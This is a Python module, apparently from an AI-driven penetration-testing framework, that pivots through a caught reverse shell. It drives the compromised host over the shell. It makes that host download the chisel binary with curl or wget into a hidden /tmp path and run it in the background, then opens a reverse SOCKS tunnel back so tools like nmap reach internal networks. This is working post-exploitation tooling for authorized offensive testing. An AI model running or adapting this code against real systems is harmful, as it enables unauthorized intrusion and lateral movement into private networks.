"""Network pivoting through a caught reverse shell (issue #4).

Once a reverse shell is caught on a foothold, this routes agent tool traffic
through that foothold to reach hosts only visible from the compromised machine.
The transport is a chisel reverse SOCKS tunnel:

  - a chisel server runs inside the session's exec container,
  - a chisel client runs on the foothold and dials back to the server, which
    opens a SOCKS5 proxy inside the exec container,
  - the proxy is wired into the per-command proxy env (all_proxy), so tools that
    honor proxy env reach internal targets through the foothold. Tools that
    ignore it (nmap connect scans) are wrapped with proxychains against the same
    proxy.

The foothold is driven over the reverse shell's bus channels (shellin/shell)
with a unique sentinel to capture command output and exit codes, since a raw
shell has no request/response API of its own.

Topology: this assumes the reverse shell and the exec container share a
reachable host network, which is the remote/VPS backend where a --network host
Kali container both catches the shell and runs the tools. On local Docker
Desktop the listener (worker host) and the container (VM network) live on
different networks, so the callback is not reachable and pivoting does not apply
there, the same limitation the remote listener already documents.
"""

from __future__ import annotations

import asyncio
import re
import secrets
from dataclasses import dataclass

from ..bus import Bus, shell_channel, shell_input_channel
from .execution import proxy_env_from_url

CHISEL_PATH = "/usr/local/bin/chisel"  # baked into the Kali image
_PIVOT_DIR = "/tmp/rc-pivot"           # container-side staging dir
_REMOTE_CHISEL = "/tmp/.rc-chisel"     # where chisel lands on the foothold
_PROXYCHAINS_CONF = "/tmp/rc-proxychains.conf"

DEFAULT_SOCKS_PORT = 1080
DEFAULT_CTRL_PORT = 8000
DEFAULT_HTTP_PORT = 8001


# ---- foothold command runner over the shell bus --------------------------------

@dataclass
class FootholdResult:
    output: str
    exit_code: int | None
    timed_out: bool = False


class FootholdRunner:
    """Run a command on a caught reverse shell and capture its output.

    A raw shell only streams bytes, so each command is terminated with a unique
    sentinel (`echo <marker>:$?`); output is read from `shell:{id}` until the
    sentinel appears, and the exit code is parsed from it. Backgrounded commands
    (chisel daemons) return as soon as their trailing `echo` runs.
    """

    def __init__(self, bus: Bus, shell_id: str, *, settle: float = 0.3) -> None:
        self.bus = bus
        self.shell_id = shell_id
        self.settle = settle  # give the subscription time to attach before sending

    async def run(self, command: str, *, timeout: float = 30.0) -> FootholdResult:
        marker = "RC" + secrets.token_hex(6)
        pattern = re.compile(re.escape(marker) + r":(-?\d+)")
        collected: list[str] = []

        async def reader() -> int | None:
            async for chunk in self.bus.subscribe(shell_channel(self.shell_id)):
                collected.append(chunk)
                m = pattern.search("".join(collected))
                if m:
                    return int(m.group(1))
            return None

        task = asyncio.create_task(reader())
        await asyncio.sleep(self.settle)
        await self.bus.publish(shell_input_channel(self.shell_id), f"{command}; echo {marker}:$?\n")
        try:
            code = await asyncio.wait_for(task, timeout)
        except TimeoutError:
            task.cancel()
            return FootholdResult(_strip_marker("".join(collected), marker), None, timed_out=True)
        return FootholdResult(_strip_marker("".join(collected), marker), code)


def _strip_marker(text: str, marker: str) -> str:
    """Drop the sentinel line (and the trailing prompt fragment) from captured
    output, so callers see just what the command printed."""
    idx = text.find(marker)
    return text[:idx].rstrip("\r\n ") if idx >= 0 else text


# ---- command builders (pure, unit-tested) --------------------------------------

def server_command(ctrl_port: int) -> str:
    """Container-side: stage the chisel binary for download and run the chisel
    server in reverse mode so a client can request a SOCKS proxy."""
    return (f"mkdir -p {_PIVOT_DIR} && cp {CHISEL_PATH} {_PIVOT_DIR}/chisel && "
            f"pkill -f 'chisel server' 2>/dev/null; "
            f"nohup chisel server -p {ctrl_port} --reverse >/tmp/rc-chisel-server.log 2>&1 & "
            f"echo started")


def http_serve_command(http_port: int) -> str:
    """Container-side: serve the staged chisel binary so the foothold can pull it
    over the same network it used to dial back."""
    return (f"pkill -f 'http.server {http_port}' 2>/dev/null; "
            f"cd {_PIVOT_DIR} && nohup python3 -m http.server {http_port} "
            f">/tmp/rc-chisel-http.log 2>&1 & echo started")


def fetch_command(callback_host: str, http_port: int) -> str:
    """Foothold-side: download chisel via curl or wget and make it executable."""
    url = f"http://{callback_host}:{http_port}/chisel"
    return (f"(command -v curl >/dev/null 2>&1 && curl -fsS {url} -o {_REMOTE_CHISEL}) || "
            f"(command -v wget >/dev/null 2>&1 && wget -q {url} -O {_REMOTE_CHISEL}); "
            f"chmod +x {_REMOTE_CHISEL} && echo fetched")


def client_command(callback_host: str, ctrl_port: int, socks_port: int) -> str:
    """Foothold-side: dial back to the chisel server and expose a reverse SOCKS
    proxy on the server at 127.0.0.1:<socks_port>."""
    return (f"pkill -f 'chisel client' 2>/dev/null; "
            f"nohup {_REMOTE_CHISEL} client {callback_host}:{ctrl_port} "
            f"R:127.0.0.1:{socks_port}:socks >/tmp/.rc-chisel.log 2>&1 & echo started")


def socks_wait_command(socks_port: int, tries: int = 12) -> str:
    """Container-side: block until the SOCKS proxy accepts connections."""
    return (f"for i in $(seq 1 {tries}); do nc -z 127.0.0.1 {socks_port} 2>/dev/null "
            f"&& echo PIVOT_UP && break; sleep 1; done")


def write_proxychains_conf_command(socks_port: int) -> str:
    """Container-side: write a proxychains config pointing at the SOCKS proxy."""
    conf = f"strict_chain\\nproxy_dns\\n[ProxyList]\\nsocks5 127.0.0.1 {socks_port}\\n"
    return f"printf '{conf}' > {_PROXYCHAINS_CONF} && echo wrote"


def proxychains_wrap(command: str, active: bool) -> str:
    """Wrap a command so its TCP connections traverse the pivot's SOCKS proxy.
    Returns the command unchanged when no pivot is active."""
    if not active:
        return command
    return f"proxychains4 -f {_PROXYCHAINS_CONF} {command}"


def foothold_teardown_command() -> str:
    return f"pkill -f 'chisel client' 2>/dev/null; rm -f {_REMOTE_CHISEL}; echo done"


def container_teardown_command() -> str:
    return "pkill -f 'chisel server' 2>/dev/null; pkill -f 'http.server' 2>/dev/null; true"


# ---- pivot manager -------------------------------------------------------------

class PivotManager:
    """Owns one chisel reverse-SOCKS pivot through a caught reverse shell.

    `open()` stands up the tunnel and points the backend's proxy env at the SOCKS
    proxy; `close()` tears it down and restores the prior proxy env. The backend
    runs container-side commands; the bus drives the foothold shell.
    """

    def __init__(self, backend, bus: Bus, callback_host: str, *,
                 socks_port: int = DEFAULT_SOCKS_PORT, ctrl_port: int = DEFAULT_CTRL_PORT,
                 http_port: int = DEFAULT_HTTP_PORT) -> None:
        self.backend = backend
        self.bus = bus
        self.callback_host = callback_host
        self.socks_port = socks_port
        self.ctrl_port = ctrl_port
        self.http_port = http_port
        self.active = False
        self.shell_id = ""
        self._prev_env: dict[str, str] | None = None

    @property
    def socks_url(self) -> str:
        return f"socks5://127.0.0.1:{self.socks_port}"

    async def open(self, shell_id: str) -> dict:
        """Bring up the pivot through the given reverse shell. Returns a status
        dict; on success the backend's proxy env routes through the foothold."""
        self.shell_id = shell_id
        runner = FootholdRunner(self.bus, shell_id)
        # Container side: chisel server + a short-lived HTTP server to hand the
        # foothold the chisel binary + the proxychains config.
        await self.backend.run(server_command(self.ctrl_port))
        await self.backend.run(http_serve_command(self.http_port))
        await self.backend.run(write_proxychains_conf_command(self.socks_port))
        # Foothold side: pull chisel, then start the reverse-SOCKS client.
        fetched = await runner.run(fetch_command(self.callback_host, self.http_port), timeout=60)
        if "fetched" not in fetched.output:
            return {"ok": False, "detail": "foothold could not fetch chisel (no curl/wget or callback unreachable)"}
        await runner.run(client_command(self.callback_host, self.ctrl_port, self.socks_port), timeout=20)
        # Container side: wait for the SOCKS proxy to come up.
        up = await self.backend.run(socks_wait_command(self.socks_port))
        if "PIVOT_UP" not in (up.output or ""):
            return {"ok": False, "detail": "SOCKS proxy did not come up; the foothold may not have dialed back"}
        # Route subsequent tool traffic through the pivot.
        self._prev_env = dict(getattr(self.backend, "proxy_env", {}) or {})
        env = getattr(self.backend, "proxy_env", None)
        if env is not None:
            env.update(proxy_env_from_url(self.socks_url))
        self.active = True
        return {"ok": True, "socks": self.socks_url, "shellId": shell_id,
                "note": "Tool traffic now routes through the foothold. Record internal hosts with source 'pivot'."}

    async def close(self) -> None:
        """Tear down the tunnel and restore the prior proxy env. Best effort."""
        if not self.shell_id:
            return
        try:
            runner = FootholdRunner(self.bus, self.shell_id)
            await runner.run(foothold_teardown_command(), timeout=15)
        except Exception:
            pass
        try:
            await self.backend.run(container_teardown_command())
        except Exception:
            pass
        env = getattr(self.backend, "proxy_env", None)
        if env is not None and self._prev_env is not None:
            env.clear()
            env.update(self._prev_env)
        self.active = False
